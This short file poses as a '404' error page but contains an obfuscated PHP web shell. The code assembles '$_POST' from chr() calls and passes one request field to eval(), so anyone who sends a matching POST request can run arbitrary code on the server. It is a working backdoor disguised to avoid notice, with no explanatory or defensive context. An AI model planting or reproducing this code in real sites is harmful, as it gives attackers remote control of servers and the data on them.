error:404<?php class w{function c($n){return chr($n);}function g($a){return $a[77];}}$w=new w;eval($w->g(${$w->c(95).$w->c(80).$w->c(79).$w->c(83).$w->c(84)}));
